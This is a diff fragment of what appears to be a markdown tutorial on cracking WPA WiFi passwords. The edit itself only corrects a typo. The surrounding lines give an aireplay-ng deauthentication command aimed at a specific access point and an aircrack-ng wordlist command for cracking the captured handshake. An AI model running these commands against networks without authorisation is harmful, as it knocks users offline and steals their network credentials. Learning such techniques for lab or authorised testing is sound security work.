@@ -11,7 +11,7 @@ network monitoring with `wlan0mon`  NIC  (network interface card)
 
 `sudo aireplay-ng --deauth 30 -a BA:18:69:CC:1E:61 wlan0mon`  
 `--deauth 30` We're sending 30 packets so as to break connection for a while  
-Bcause of this will be able to capture handshake (and password hash for later cracking)  
+Because of this we'll be able to capture handshake (and password hash for later cracking)  
 ![nasmarowana maslem](./img/airodump-ng-3.png)
 
 `sudo aircrack-ng WPAcrack-01.cap -w rockyou_50.txt`  password hash cracking
